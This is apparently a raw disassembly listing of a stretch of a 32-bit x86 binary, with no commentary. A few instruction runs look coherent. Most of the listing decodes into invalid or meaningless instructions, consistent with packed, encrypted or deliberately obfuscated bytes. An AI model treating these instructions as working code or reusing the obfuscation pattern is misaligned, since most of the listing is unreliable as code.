  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	setnp  BYTE PTR [eax]
  40c9a0:	cmp    bl,BYTE PTR [edi-0x36]
  40c9a3:	xchg   edx,eax
  40c9a4:	jle    0x40ca24
  40c9a6:	jo     0x40ca21
  40c9a8:	jle    0x40ca28
  40c9aa:	mov    ecx,0x6a4b60c7
  40c9af:	pushf  
  40c9b0:	pop    edx
  40c9b1:	jbe    0x40c9bb
  40c9b3:	sbb    BYTE PTR [edx+0x5f],0x15
  40c9b7:	jle    0x40c93f
  40c9b9:	sti    
  40c9ba:	xor    DWORD PTR [edx],ebp
  40c9bc:	ret    
  40c9bd:	sub    BYTE PTR [edx-0x137c68b8],dh
  40c9c3:	jl     0x40c9c2
  40c9c5:	test   BYTE PTR [ebx],0xfc
  40c9c8:	rcr    dl,cl
  40c9ca:	iret   
  40c9cb:	iret   
  40c9cc:	sub    ch,BYTE PTR [edi]
  40c9ce:	mov    eax,0x1ab66c1f
  40c9d3:	loopne 0x40ca07
  40c9d5:	cmp    DWORD PTR [edx],ecx
  40c9d7:	repnz enter 0x13b5,0x2d
  40c9dc:	push   esi
  40c9dd:	in     al,0xbf
  40c9df:	and    bl,BYTE PTR [ecx-0x4baa8e4b]
  40c9e5:	hlt    
  40c9e6:	retf   
  40c9e7:	and    BYTE PTR [esi],0x9e
  40c9ea:	pop    edi
  40c9eb:	test   eax,0x538d6251
  40c9f0:	sub    al,0xc2
  40c9f2:	mov    WORD PTR [ebp-0x138b2877],gs
  40c9f8:	jae    0x40c9c2
  40c9fa:	std    
  40c9fb:	xor    ebx,eax
  40c9fd:	jmp    0x40ca71
  40c9ff:	and    ebp,DWORD PTR [eax]
  40ca01:	fucomi st,st(3)
  40ca03:	and    cl,BYTE PTR ds:0x11d2aec9
  40ca09:	and    BYTE PTR [edx+0x9],bl
  40ca0c:	cmp    eax,eax
  40ca0e:	sub    edx,ecx
  40ca10:	clc    
  40ca11:	mov    al,BYTE PTR [ebp+0x4ea253c4]
  40ca17:	jbe    0x40ca66
  40ca19:	lock sbb DWORD PTR [edx],eax
  40ca1c:	cmp    DWORD PTR [esi+0x7],edx
  40ca1f:	aad    0xa4
  40ca21:	(bad)  
  40ca22:	fbstp  TBYTE PTR [ebp+eax*4+0x35]
  40ca26:	or     dh,bh
  40ca28:	dec    esi
  40ca29:	or     BYTE PTR [ebp+ecx*1-0x43],ah
  40ca2d:	dec    edi
  40ca2e:	mov    gs,WORD PTR [edi]
  40ca30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca31:	mov    bh,0xf3
  40ca33:	enter  0x9ae0,0x6a
  40ca37:	sub    BYTE PTR [edi+0x4b],0x6c
  40ca3b:	push   cs
  40ca3c:	sub    eax,0x2e0e8cb3
  40ca41:	icebp  
  40ca42:	and    dh,BYTE PTR [eax]
  40ca44:	and    DWORD PTR [esi+0x7cceee05],ebx
  40ca4a:	mov    ch,0xa7
  40ca4c:	mov    ds:0x96c6a084,al
  40ca51:	enter  0xa006,0xaa
  40ca55:	mov    edx,edi
  40ca57:	push   0xffffffc9
  40ca59:	ja     0x40cabd
  40ca5b:	jno    0x40ca04
  40ca5d:	inc    esi
  40ca5e:	clc    
  40ca5f:	retf   0xfd6c
  40ca62:	jbe    0x40cad6
  40ca64:	push   ecx
  40ca65:	lods   al,BYTE PTR ds:[esi]
  40ca66:	sbb    ebp,DWORD PTR [edx+esi*4-0x41da868d]
  40ca6d:	mov    DWORD PTR [ebx-0x74d7b1b7],edx
  40ca73:	sub    al,0x17
  40ca75:	pop    edx
  40ca76:	mov    ebp,DWORD PTR [esi+0x3296662f]
  40ca7c:	test   DWORD PTR [eax-0x14],esp
  40ca7f:	push   edi
  40ca80:	and    eax,0x160175c
  40ca85:	lods   al,BYTE PTR ds:[esi]
  40ca86:	push   ss
  40ca87:	stos   BYTE PTR es:[edi],al
  40ca88:	fwait
  40ca89:	popf   
  40ca8a:	mov    esp,DWORD PTR [esi]
  40ca8c:	loop   0x40ca8e
  40ca8e:	imul   DWORD PTR [edi]
  40ca90:	ret    0x7951
  40ca93:	nop
  40ca94:	and    DWORD PTR [ecx],0x4e92551e
  40ca9a:	xlat   BYTE PTR ds:[ebx]
  40ca9b:	push   es
  40ca9c:	jmp    0x40ca41
  40ca9e:	mov    esi,0x37762561
  40caa3:	dec    esp
  40caa4:	stos   DWORD PTR es:[edi],eax
  40caa5:	jle    0x40ca72
  40caa7:	mov    esi,0x26222785
  40caac:	ja     0x40cb0e
  40caae:	xor    BYTE PTR [ecx-0x516ff9c6],dh
  40cab4:	adc    cl,BYTE PTR [ecx]
  40cab6:	add    eax,0x6f9a6347
  40cabb:	push   ebx
  40cabc:	test   bl,ch
  40cabe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cabf:	mov    esp,DWORD PTR [esi+0x3a8312b9]
  40cac5:	push   edi
  40cac6:	sbb    BYTE PTR cs:[ecx+0x53870383],bh
  40cacd:	popf   
  40cace:	mov    al,ds:0x6fa96c45
  40cad3:	(bad)  
  40cad5:	test   BYTE PTR [edi+0x28],cl
  40cad8:	es loopne 0x40cae4
  40cadb:	dec    ecx
  40cadc:	cs inc edx
  40cade:	repz push ss
  40cae0:	(bad)
  40cae3:	pop    ebp
  40cae4:	in     al,0x37
  40cae6:	push   esp
  40cae7:	push   ss
  40cae8:	inc    edx
  40cae9:	mov    DWORD PTR [edi],0x9a6fea8d
  40caef:	fnstsw WORD PTR [ebx-0x3e]
  40caf2:	xchg   DWORD PTR [ecx-0x269ab91c],edx
  40caf8:	outs   dx,DWORD PTR ds:[esi]
  40caf9:	test   BYTE PTR [ebx],dh
  40cafb:	adc    edx,0xfffffff4
  40cafe:	sbb    al,0xbb
  40cb00:	jb     0x40cb6d
  40cb02:	clc    
  40cb03:	aam    0xda
  40cb05:	xor    al,0x4e
  40cb07:	xor    BYTE PTR [eax],0x70
  40cb0a:	test   ecx,esi
  40cb0c:	sub    bl,bl
  40cb0e:	dec    eax
  40cb0f:	js     0x40cb8e
  40cb11:	push   0x33d8f631
  40cb16:	pop    ds
  40cb17:	bound  eax,QWORD PTR [esi+0x68e426fc]
  40cb1d:	ffree  st(2)
  40cb1f:	xchg   esi,eax
  40cb20:	pop    edi
  40cb21:	mov    esp,0xb5783a13
  40cb26:	rcr    dh,cl
  40cb28:	fwait
  40cb29:	popf   
  40cb2a:	inc    edi
  40cb2b:	jle    0x40cb93
  40cb2d:	pop    esi
  40cb2e:	ja     0x40cabf
  40cb30:	mov    dl,dh
  40cb32:	test   al,0x68
  40cb34:	sbb    dh,BYTE PTR [esi]
  40cb36:	push   ss
  40cb37:	aaa    
  40cb38:	scas   al,BYTE PTR es:[edi]
  40cb39:	mov    WORD PTR [esi-0x68ec5aa6],fs
  40cb3f:	push   eax
  40cb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb41:	dec    edx
  40cb42:	mov    dh,0x8d
  40cb44:	inc    ebx
  40cb45:	stc    
  40cb46:	fisttp DWORD PTR [edi+0x60fa3842]
  40cb4c:	cdq    
  40cb4d:	js     0x40cad6
  40cb4f:	cmp    DWORD PTR [eax-0x371585a8],esi
  40cb55:	mov    eax,ds:0xc3a43bd
  40cb5a:	mov    cl,0xf0
  40cb5c:	imul   ebx,esp,0x3c1ea7b4
  40cb62:	bound  esp,QWORD PTR ds:0x22f46d05
  40cb68:	imul   ecx,DWORD PTR es:[edx-0x57246a3a],0xffffff8b
  40cb70:	into   
  40cb71:	mov    edx,0x707c78b2
  40cb76:	lahf   
  40cb77:	jne    0x40cb1b
  40cb79:	(bad)  
  40cb7a:	stc    
  40cb7b:	scas   al,BYTE PTR es:[edi]
  40cb7c:	inc    DWORD PTR [edi+0x633076d6]
  40cb82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb83:	arpl   WORD PTR [esi],cx
  40cb85:	stc    
  40cb86:	(bad)  
  40cb87:	ins    BYTE PTR es:[edi],dx
  40cb88:	scas   al,BYTE PTR es:[edi]
  40cb89:	fnstenv [ebx]
  40cb8b:	call   0xec05a2c3
  40cb90:	(bad)  
  40cb91:	dec    ebp
  40cb92:	test   eax,0x5000390b
  40cb97:	mov    al,ds:0x5a221053
  40cb9c:	and    ecx,DWORD PTR [edx+0x58]
  40cb9f:	iret   
  40cba0:	sub    BYTE PTR [ecx+ebp*4+0x10],ah
  40cba4:	pusha  
  40cba5:	pop    ecx
  40cba6:	jne    0x40cba6
  40cba8:	jne    0x40cbbe
  40cbaa:	push   esp
  40cbab:	jg     0x40cbfa
  40cbad:	inc    DWORD PTR [eax]
  40cbaf:	pop    ds
  40cbb0:	dec    eax
  40cbb1:	or     al,cl
  40cbb3:	out    0x5a,al
  40cbb5:	jno    0x40cb37
  40cbb7:	fsubr  st(0),st
  40cbb9:	pushf  
  40cbba:	xor    ah,ch
  40cbbc:	push   edx
  40cbbd:	stc    
  40cbbe:	ds pop ebp
  40cbc0:	call   0xedd8:0x501f1610
  40cbc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbc8:	sub    eax,0x549eda4a
  40cbcd:	jge    0x40cbc1
  40cbcf:	mov    ecx,0x599b70b7
  40cbd4:	add    al,0x27
  40cbd6:	push   edx
  40cbd7:	shl    DWORD PTR es:[esi+0x6426f6fe],cl
  40cbde:	jg     0x40cb8b
  40cbe0:	call   0xe24dabdd
  40cbe5:	cmp    cl,BYTE PTR ds:0x6096e05d
  40cbeb:	lock push eax
  40cbed:	inc    esi
  40cbee:	ja     0x40cc4d
  40cbf0:	outs   dx,DWORD PTR ds:[esi]
  40cbf1:	shr    dl,cl
  40cbf3:	mov    edx,0xe5b51ee0
  40cbf8:	mov    ecx,0x4d61fe06
  40cbfd:	mov    ecx,0xc1dd9bb9
  40cc02:	jle    0x40cc3c
  40cc04:	adc    DWORD PTR [ebx-0x7d3a0702],edx
  40cc0a:	pop    ds
  40cc0b:	rol    DWORD PTR [eax+0xb],1
  40cc0e:	jb     0x40cbdf
  40cc10:	lock nop
  40cc12:	push   0x62cc195d
  40cc17:	stc    
  40cc18:	retfw  0x93c0
  40cc1c:	fwait
  40cc1d:	mov    ds:0xdd789ed6,eax
  40cc22:	popf   
  40cc23:	push   0x2a542e1d
  40cc28:	(bad)  
  40cc29:	rol    DWORD PTR [esi],1
  40cc2b:	pop    edx
  40cc2c:	dec    ecx
  40cc2d:	xchg   ebp,eax
  40cc2e:	mov    eax,0xde4abfdf
  40cc33:	cmp    ebp,DWORD PTR [edx+0x1d07224b]
  40cc39:	iret   
  40cc3a:	dec    esp
  40cc3b:	out    dx,eax
  40cc3c:	jne    0x40cbfd
  40cc3e:	int    0x34
  40cc40:	jb     0x40cc65
  40cc42:	shr    BYTE PTR [edx+0x21558937],0xdb
  40cc49:	in     eax,0x86
  40cc4b:	jmp    0x40cc4b
  40cc4d:	out    0xdb,al
  40cc4f:	scas   al,BYTE PTR es:[edi]
  40cc50:	fs xchg ebx,eax
  40cc52:	shr    DWORD PTR [eax],1
  40cc54:	push   ss
  40cc55:	cwde   
  40cc56:	xor    al,BYTE PTR [edx+esi*2]
  40cc59:	xor    eax,0x363941b3
  40cc5e:	je     0x40cc90
  40cc60:	fisttp DWORD PTR cs:[edx-0x4e8955b0]
  40cc67:	stos   DWORD PTR es:[edi],eax
  40cc68:	scas   eax,DWORD PTR es:[edi]
  40cc69:	bound  ebx,QWORD PTR [ebx+0x2169c749]
  40cc6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc70:	dec    esp
  40cc71:	out    dx,eax
  40cc72:	repz push es
  40cc74:	sub    BYTE PTR [edi-0x3a0370d9],cl
  40cc7a:	mov    dl,0xac
  40cc7c:	ins    BYTE PTR es:[edi],dx
  40cc7d:	mov    bl,0x82
  40cc7f:	sub    eax,0x51acc8b4
  40cc84:	adc    eax,0x9f99f5c2
  40cc89:	lea    ecx,[eax+eax*8+0x18]
  40cc8d:	inc    ebx
  40cc8e:	dec    ebp
  40cc8f:	push   0xffffffdc
  40cc91:	inc    esi
  40cc92:	xchg   DWORD PTR [esi],ecx
  40cc94:	fcomi  st,st(3)
  40cc96:	stos   DWORD PTR es:[edi],eax
  40cc97:	gs cmp ecx,ecx
  40cc9a:	mov    edx,DWORD PTR [ecx-0x5e8ac4bc]
  40cca0:	aam    0x3a
  40cca2:	hlt    
  40cca3:	jmp    0x40cd03
  40cca5:	pop    esi
  40cca6:	push   eax
  40cca7:	dec    esp
  40cca8:	outs   dx,DWORD PTR ds:[esi]
  40cca9:	aam    0xe0
  40ccab:	cli    
  40ccac:	pop    esp
  40ccad:	push   ebp
  40ccae:	xchg   ecx,eax
  40ccaf:	push   ss
  40ccb0:	dec    edx
  40ccb1:	dec    eax
  40ccb2:	jge    0x40cd1b
  40ccb4:	daa    
  40ccb5:	jnp    0x40cc4f
  40ccb7:	das    
  40ccb8:	out    dx,al
  40ccb9:	push   ebp
  40ccba:	fnsave [ebx-0x18]
  40ccbd:	(bad)  
  40ccbf:	mov    ah,0x1b
  40ccc1:	pusha  
  40ccc2:	jmp    0x80cf:0x3cee59ff
  40ccc9:	push   es
  40ccca:	cmp    BYTE PTR [ecx-0x63],0x13
  40ccce:	xor    BYTE PTR [ecx-0x27],al
  40ccd1:	(bad)  
  40ccd2:	cvtps2pd xmm1,QWORD PTR [ebp-0x2f0abd4a]
  40ccd9:	adc    BYTE PTR [edx+edi*4+0x65],0x3
  40ccde:	loope  0x40ccdf
  40cce0:	push   es
  40cce1:	adc    dh,ch
  40cce3:	(bad)  
  40cce4:	jl     0x40cd0d
  40cce6:	xchg   esi,ecx
  40cce8:	div    DWORD PTR [ecx+0x25]
  40cceb:	mov    fs,WORD PTR [edx+0x604b0c0a]
  40ccf1:	add    al,0xd9
  40ccf3:	jne    0x40cced
  40ccf5:	add    al,0xa9
  40ccf7:	cmc    
  40ccf8:	mov    ebx,DWORD PTR [edx-0x6fa25bc6]
  40ccfe:	mov    eax,0x951e1e78
  40cd03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd04:	stos   BYTE PTR es:[edi],al
  40cd05:	mov    eax,0xd77d870b
  40cd0a:	xchg   ecx,eax
  40cd0b:	dec    edx
  40cd0c:	add    BYTE PTR [ecx-0x70],dh
  40cd0f:	sbb    BYTE PTR [ecx-0x54ca4f8e],bl
  40cd15:	aas    
  40cd16:	imul   edx,ecx,0x9c93fc89
  40cd1c:	out    dx,al
  40cd1d:	aam    0xdf
  40cd1f:	data16 jae 0x40cd1e
  40cd22:	retf   0x7183
  40cd25:	xor    eax,0xa47e0425
  40cd2a:	jp     0x40cceb
  40cd2c:	dec    ebp
  40cd2d:	arpl   ax,ax
  40cd2f:	iret   
  40cd30:	cmp    ch,BYTE PTR [ebx-0x39619a8a]
  40cd36:	mov    al,BYTE PTR [ecx-0x5abf1793]
  40cd3c:	xor    eax,0xefe6e7ed
  40cd41:	sub    DWORD PTR [eax+0x6c9b26c8],ecx
  40cd47:	mov    dl,0x3b
  40cd49:	push   0xdd9880a6
  40cd4e:	mov    edi,0x3bc103c3
  40cd53:	xor    al,0xf9
  40cd55:	sub    DWORD PTR [edi],0xffffffef
  40cd58:	or     dl,BYTE PTR [ebx+0x21b5fc6a]
  40cd5e:	and    al,BYTE PTR [edi-0x5f498483]
  40cd64:	and    eax,eax
  40cd66:	gs neg bl
  40cd69:	js     0x40cd1a
  40cd6b:	and    DWORD PTR ds:0x9d40945d,0xbd6d9925
  40cd75:	push   ebp
  40cd76:	adc    eax,0xe3de9d4c
  40cd7b:	pop    ss
  40cd7c:	fwait
  40cd7d:	ret    
  40cd7e:	dec    edi
  40cd7f:	js     0x40cd54
  40cd81:	mov    eax,0xb1d005
  40cd86:	in     eax,dx
  40cd87:	popf   
  40cd88:	repz pop ds
  40cd8a:	jb     0x40cdd7
  40cd8c:	cwde   
  40cd8d:	dec    ebx
  40cd8e:	sub    BYTE PTR [eax+0x77],dh
  40cd91:	arpl   WORD PTR [esp+eax*1],bx
  40cd94:	cli    
  40cd95:	xchg   esi,eax
  40cd96:	mov    ch,0x29
  40cd98:	jmp    0xd7e1:0x48a768c0
  40cd9f:	stos   DWORD PTR es:[edi],eax
  40cda0:	mov    cl,0x32
  40cda2:	and    BYTE PTR [eax+ecx*4],dh
  40cda5:	xchg   esp,eax
  40cda6:	pop    ds
  40cda7:	cdq    
  40cda8:	jb     0x40cddc
  40cdaa:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40cdb0:	hlt    
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	inc    ebx
  40cdda:	test   BYTE PTR [edx],dh
  40cddc:	fmul   st,st(4)
  40cdde:	sahf   
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	dec    ebp
  40cde6:	xor    DWORD PTR [edx-0xa460f0f],ecx
  40cdec:	lahf   
  40cded:	xchg   esi,eax
  40cdee:	pop    es
  40cdef:	(bad)  
  40cdf0:	or     eax,0xac98138c
  40cdf5:	call   0x8c08332d
  40cdfa:	int3   
  40cdfb:	xchg   DWORD PTR [edx-0x333153e8],eax
  40ce01:	stos   DWORD PTR es:[edi],eax
  40ce02:	mov    ecx,0x189f2b0d
  40ce07:	fadd   DWORD PTR [edx+0x34]
  40ce0a:	adc    eax,0xdab8785e
  40ce0f:	aad    0x5
  40ce11:	fsin   
  40ce13:	out    0xd1,al
  40ce15:	xor    al,0x72
  40ce17:	fimul  WORD PTR [eax+edx*8]
  40ce1a:	unpcklps xmm3,XMMWORD PTR [ebx+0x6a]
  40ce1e:	jp     0x40ce00
  40ce20:	ret    0xb56a
  40ce23:	(bad)  
  40ce24:	fidiv  WORD PTR ds:0xa4861bee
  40ce2a:	ror    BYTE PTR [ebx-0x70703c80],1
  40ce30:	xlat   BYTE PTR ds:[ebx]
  40ce31:	or     al,0x3
  40ce33:	xor    ebx,DWORD PTR [esi-0x3af3beba]
  40ce39:	xor    eax,0xa452b1d3
  40ce3e:	out    0xf7,al
  40ce40:	repz mov esi,0x6ffad107
  40ce46:	inc    ebx
  40ce47:	mov    WORD PTR [edx-0x45f8720e],ds
  40ce4d:	cmp    esi,esp
  40ce4f:	std    
  40ce50:	out    dx,al
  40ce51:	inc    ebx
  40ce52:	pushf  
  40ce53:	call   0xa504:0x339fb116
  40ce5a:	into   
  40ce5b:	mov    dh,0x91
  40ce5d:	sbb    al,0xd7
  40ce5f:	push   ebx
  40ce60:	dec    DWORD PTR [ecx-0x42b7d1ac]
  40ce66:	mov    eax,0xca203739
  40ce6b:	(bad)  
  40ce6c:	aas    
  40ce6d:	retf   0x4500
  40ce70:	inc    eax
  40ce71:	pop    edi
  40ce72:	rol    BYTE PTR [ecx-0x57ad4cb5],1
  40ce78:	and    al,0xe8
  40ce7a:	fwait
  40ce7b:	inc    eax
  40ce7c:	ins    BYTE PTR es:[edi],dx
  40ce7d:	push   es
  40ce7e:	std    
  40ce7f:	push   cs
  40ce80:	dec    esp
  40ce81:	fild   WORD PTR [edi]
  40ce83:	das    
  40ce84:	aam    0xb7
  40ce86:	xor    al,0x4c
  40ce88:	mov    ch,BYTE PTR [ecx+0x3c]
  40ce8b:	in     al,0xdb
  40ce8d:	call   0xafa8:0xc99fc68c
  40ce94:	stos   DWORD PTR es:[edi],eax
  40ce95:	push   ds
  40ce96:	jecxz  0x40ceda
  40ce98:	pusha  
  40ce99:	push   0xffffff93
  40ce9b:	imul   eax,DWORD PTR [eax-0x4ab5a270],0xfffffff4
  40cea2:	fistp  QWORD PTR [ecx+0x145b8808]
  40cea8:	(bad)  
  40cea9:	mov    ds:0xb4310696,eax
  40ceae:	lds    eax,FWORD PTR [edx+0x18]
  40ceb1:	stc    
  40ceb2:	lea    ecx,[ecx]
  40ceb4:	call   0x1718:0xaa1b8bb
  40cebb:	cmp    BYTE PTR [ecx-0x30],bh
  40cebe:	mov    edi,0x9d5c04bc
  40cec3:	add    bh,BYTE PTR [esp+eiz*2-0x584e1cfe]
  40ceca:	cmp    BYTE PTR ds:0xc39bf8ff,0xf
  40ced1:	out    dx,al
  40ced2:	mov    al,0xc7
  40ced4:	outs   dx,BYTE PTR ds:[esi]
  40ced5:	dec    ecx
  40ced6:	fdivr  QWORD PTR [ecx+eax*2]
  40ced9:	and    DWORD PTR [eax-0x555b0f09],ecx
  40cedf:	push   edx
  40cee0:	or     BYTE PTR [ecx+0x9b862],0x37
  40cee7:	rcr    DWORD PTR [ecx],0xa4
  40ceea:	xchg   ebp,eax
  40ceeb:	jge    0x40cf3e
  40ceed:	popf   
  40ceee:	clc    
  40ceef:	push   esp
  40cef0:	jb     0x40cecd
  40cef2:	sti    
  40cef3:	outs   dx,DWORD PTR ds:[esi]
  40cef4:	pop    esi
  40cef5:	xor    eax,0x5079facf
  40cefa:	push   eax
  40cefb:	and    al,BYTE PTR [eax+0x20]
  40cefe:	jle    0x40cf36
  40cf00:	xor    dl,bl
  40cf02:	(bad)  
  40cf03:	cmp    BYTE PTR [edi+0x56],bl
  40cf06:	inc    ebp
  40cf07:	xor    DWORD PTR [edi+0x60],ebp
  40cf0a:	cmp    al,0x10
  40cf0c:	enter  0xb1c5,0x15
  40cf10:	mov    edx,DWORD PTR [esi]
  40cf12:	pop    eax
  40cf13:	mov    dl,BYTE PTR [ecx]
  40cf15:	pop    edi
  40cf16:	mov    bh,0x91
  40cf18:	imul   esp,DWORD PTR [ebp+0x4dcd1ad],0xa
  40cf1f:	sbb    bl,BYTE PTR [ebx-0x7e]
  40cf22:	jle    0x40cf4d
  40cf24:	jbe    0x40cf96
  40cf26:	dec    ebp
  40cf27:	(bad)  gs:[ecx]
  40cf2a:	imul   esp,DWORD PTR [esi+0x75],0x2e6ffb68
  40cf31:	push   ebx
  40cf32:	add    BYTE PTR [edx-0x6b],cl
  40cf35:	ins    BYTE PTR es:[edi],dx
  40cf36:	pop    esp
  40cf37:	rcr    BYTE PTR [ebx+edx*2+0x1d],1
  40cf3b:	adc    edi,eax
  40cf3d:	or     eax,0xb111baa
  40cf42:	lea    esi,[ecx+0x11]
  40cf45:	cli    
  40cf46:	sub    BYTE PTR [ebp-0x2e2a6575],al
  40cf4c:	dec    ebx
  40cf4d:	push   ebx
  40cf4e:	pusha  
  40cf4f:	shl    DWORD PTR [ebx-0x75f7bf0e],0xb6
  40cf56:	scas   al,BYTE PTR es:[edi]
  40cf57:	out    dx,eax
  40cf58:	dec    eax
  40cf59:	loope  0x40cf87
  40cf5b:	in     al,0x19
  40cf5d:	jnp    0x40ceed
  40cf5f:	inc    esp
  40cf60:	rcl    dh,0x8
  40cf63:	imul   ecx,edx,0x9
  40cf66:	jp     0x40cfbd
  40cf68:	pop    ds
  40cf69:	sbb    DWORD PTR [edx-0x3a],ecx
  40cf6c:	int3   
  40cf6d:	dec    ebx
  40cf6e:	push   ds
  40cf6f:	mov    ebp,0xfb037e41
  40cf74:	sbb    eax,0x589033f2
  40cf79:	sub    al,0x30
  40cf7b:	pop    ebx
  40cf7c:	iret   
  40cf7d:	cmp    esp,eax
  40cf7f:	pop    ecx
  40cf80:	xchg   DWORD PTR [ebx+0x58d9ae65],edi
  40cf86:	imul   eax,eax,0x11
  40cf89:	xlat   BYTE PTR ds:[ebx]
  40cf8a:	ds lock out dx,al
  40cf8d:	pop    esp
  40cf8e:	daa    
  40cf8f:	sti    
  40cf90:	sar    edi,0x44
  40cf93:	rcl    BYTE PTR [eax+0x58],0x42
  40cf97:	or     eax,0x62ac8f40
  40cf9c:	ja     0x40cfe2
  40cf9e:	pop    edi
  40cf9f:	shr    DWORD PTR ds:0xdeac7398,0x5b
  40cfa6:	jbe    0x40cf5a
  40cfa8:	lods   eax,DWORD PTR ds:[esi]
  40cfa9:	add    DWORD PTR [edx-0x77],0xffffff8f
  40cfad:	shl    ebp,1
  40cfaf:	int    0xc7
  40cfb1:	mov    ds:0xabe4c7da,eax
  40cfb6:	shl    BYTE PTR [edi+0x276e801b],0xfe
  40cfbd:	pop    ecx
  40cfbe:	ds ret 0xba68
  40cfc2:	aas    
  40cfc3:	cmp    edx,DWORD PTR [esi+0x15]
  40cfc6:	pop    esp
  40cfc7:	add    eax,0xaaddae29
  40cfcc:	in     al,dx
  40cfcd:	outs   dx,BYTE PTR ds:[esi]
  40cfce:	push   esp
  40cfcf:	cmc    
  40cfd0:	popa   
  40cfd1:	imul   ebx,DWORD PTR [ebx],0xffffffef
  40cfd4:	std    
  40cfd5:	leave  
  40cfd6:	lds    esi,FWORD PTR [edi+eax*2]
  40cfd9:	jecxz  0x40d002
  40cfdb:	(bad)  [esi]
  40cfdd:	cld    
  40cfde:	aad    0x8b
  40cfe0:	or     eax,0xede9ed8d
  40cfe5:	push   0x65c7468d
  40cfea:	mov    DWORD PTR [ebp-0x3b840720],0xc563116
  40cff4:	pop    ecx
  40cff5:	fnstsw WORD PTR [edi-0x1]
  40cff8:	outs   dx,BYTE PTR ds:[esi]
  40cff9:	mov    ds:0x86979af3,al
  40cffe:	mov    dl,0x1d
  40d000:	shr    BYTE PTR [edi+0x50],0x8a
  40d004:	and    esi,edx
  40d006:	lock mov bh,0xd9
  40d009:	cmp    ebp,DWORD PTR [ecx]
  40d00b:	mov    bh,0x26
  40d00d:	fist   DWORD PTR [ebx-0x72495886]
  40d013:	add    al,0x5a
  40d015:	push   0xaadb7258
  40d01a:	rcr    bh,0xaf
  40d01d:	mov    dh,0xc4
  40d01f:	ss pop edi
  40d021:	and    cl,BYTE PTR [esi]
  40d023:	pop    ebx
  40d024:	sbb    esi,DWORD PTR [ebx+0x75d8a264]
  40d02a:	sbb    DWORD PTR [esi-0x7b75c2c2],0x2d
  40d031:	xchg   ecx,eax
  40d032:	mov    DWORD PTR [edx],ecx
  40d034:	or     eax,0x4e56f523
  40d039:	icebp  
  40d03a:	repz mov eax,ds:0x9117b73e
  40d040:	mov    bl,0xc8
  40d042:	cli    
  40d043:	pop    edx
  40d044:	cmc    
  40d045:	out    0x4f,eax
  40d047:	mov    al,ds:0x68b00b65
  40d04c:	xor    eax,0xba5882f0
  40d051:	jmp    0x8479:0x3384f141
  40d058:	xchg   ecx,eax
  40d059:	test   eax,0x3f4df6a6
  40d05e:	jg     0x40d00c
  40d060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d061:	lds    esp,FWORD PTR [edi-0x70]
  40d064:	sahf   
  40d065:	out    0x4,eax
  40d067:	jecxz  0x40d08d
  40d069:	cmp    eax,0x958d2855
  40d06e:	xor    ecx,esi
  40d070:	or     eax,0x9cc22d34
  40d075:	xchg   ebp,eax
  40d076:	mov    esi,0xf9d49072
  40d07b:	add    eax,0x8213b479
  40d080:	(bad)  
  40d081:	inc    eax
  40d082:	ins    DWORD PTR es:[edi],dx
  40d083:	int    0x74
  40d085:	add    DWORD PTR [esi+0x15634034],ebp
  40d08b:	in     eax,dx
  40d08c:	push   edx
  40d08d:	mov    DWORD PTR [edx+ebx*2+0x6ab0c3],eax
  40d094:	mov    ah,0x9e
  40d096:	cs cdq 
  40d098:	pop    ss
  40d099:	iret   
  40d09a:	mov    dh,BYTE PTR [ecx+0x3f]
  40d09d:	inc    eax
  40d09e:	bound  ecx,QWORD PTR [ecx+0x3c]
  40d0a1:	xchg   edx,eax
  40d0a2:	or     DWORD PTR [ebp+0x3e],edi
  40d0a5:	or     eax,0x8d3d6942
  40d0aa:	jne    0x40d116
  40d0ac:	xchg   ecx,eax
  40d0ad:	aad    0xe0
  40d0af:	leave  
  40d0b0:	mov    ah,0x43
  40d0b2:	ins    BYTE PTR es:[edi],dx
  40d0b3:	out    0xe7,al
  40d0b5:	nop
  40d0b6:	test   DWORD PTR [ecx+0x3e],esi
  40d0b9:	pop    edx
  40d0ba:	call   0x578:0xab2e0fd0
  40d0c1:	dec    esp
  40d0c2:	mov    ds:0xc8aa068b,eax
  40d0c7:	sahf   
  40d0c8:	adc    al,0xf3
  40d0ca:	sar    BYTE PTR es:[eax],0x77
  40d0ce:	nop
  40d0cf:	adc    bh,al
  40d0d1:	imul   edi,DWORD PTR [ebp+0x3c56d6b7],0x44
  40d0d8:	mov    bh,0xa
  40d0da:	jl     0x40d07a
  40d0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0dd:	out    0xff,eax
  40d0df:	leave  
  40d0e0:	jle    0x40d109
  40d0e2:	ror    DWORD PTR [ebp-0x5a37724d],0xec
  40d0e9:	xlat   BYTE PTR ds:[ebx]
  40d0ea:	cmp    DWORD PTR [edi-0x67b53fb7],ecx
  40d0f0:	mov    dh,0x96
  40d0f2:	sbb    dh,BYTE PTR [eax+edx*2-0x56895451]
  40d0f9:	outs   dx,DWORD PTR ds:[esi]
  40d0fa:	jnp    0x40d142
